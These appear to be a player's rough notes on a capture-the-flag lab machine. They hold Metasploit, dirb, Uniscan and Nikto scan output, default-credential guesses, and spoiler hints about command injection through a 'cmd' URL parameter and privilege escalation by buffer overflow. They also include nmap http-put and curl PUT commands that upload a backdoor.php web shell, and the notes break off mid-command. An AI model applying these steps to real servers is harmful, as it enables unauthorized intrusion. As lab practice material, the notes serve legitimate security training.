@@ -1,0 +1,84 @@
+Hosts
+=====
+
+address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
+-------      ---  ----  -------  ---------  -----  -------  ----  --------
+10.10.10.27             Linux                      server
+
+msf > services
+
+Services
+========
+
+host         port   proto  name     state     info
+----         ----   -----  ----     -----     ----
+10.10.10.27  22     tcp    ssh      open      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 Ubuntu Linux; protocol 2.0
+10.10.10.27  80     tcp    http     open      Apache httpd 2.4.18 (Ubuntu)
+10.10.10.27  84     tcp    ctf      filtered
+10.10.10.27  8654   tcp    unknown  filtered
+10.10.10.27  49167  tcp    unknown  filtered
+
+
+dirb http://10.10.10.27:80/ -w
+
+  ---- Scanning URL: http://10.10.10.27:80/ ----
+  + http://10.10.10.27:80/admin.php (CODE:200|SIZE:451)
+  + http://10.10.10.27:80/index.html (CODE:200|SIZE:514)
+  + http://10.10.10.27:80/server-status (CODE:403|SIZE:299)
+  ==> DIRECTORY: http://10.10.10.27:80/uploads/
+
+  ---- Entering directory: http://10.10.10.27:80/uploads/ ----
+  (!) WARNING: Directory IS LISTABLE. No need to scan it.
+      (Use mode '-w' if you want to scan it anyway)
+  + http://10.10.10.27:80/uploads/passwd (CODE:200|SIZE:0)
+
+  [*] Using code '404' as not found for 10.10.10.27
+  [+] Found http://10.10.10.27:80/icons/ 403 (10.10.10.27)
+  [+] Found http://10.10.10.27:80/uploads/ 200 (10.10.10.27)
+
+Uniscan
+
+  | Directory check:
+  | [+] CODE: 200 URL: http://10.10.10.27/uploads/
+  ===================================================================================================
+  |
+  | File check:
+  | [+] CODE: 200 URL: http://10.10.10.27/admin.php
+  | [+] CODE: 200 URL: http://10.10.10.27/index.html
+
+Nikto:
+  + Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
+  + OSVDB-29786: /admin.php?en_log_id=0&action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+  + OSVDB-29786: /admin.php?en_log_id=0&action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+  + OSVDB-3092: /admin.php: This might be interesting...
+  + OSVDB-3233: /icons/README: Apache default file found.
+
+
+admin:admin
+
+password is: skoupidotenekes ?
+user: admin
+
+Spoilers
+
+  curl upload
+
+  &cmd=whoami to the end of the URL and it will run whoami
+
+  hint in /home/xalvas
+
+  /home/xalvas/dontforget.txt
+
+   login the admin page > curl is a friend
+
+   priv esc > binary bof exploit development > bof in corlan team
+
+    https://sploitfun.wordpress.com/
+    https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/
+
+    
+Shell file upload
+  nmap -p 80 --script http-put --script-args http-put.url='/admin.php/backdoor.php',http-put.file='backdoor.php' 10.10.10.27 -v
+
+  curl --upload-file test.txt -v --url http://target/test/test.txt
+    OR you can also do: curl -X PUT -d
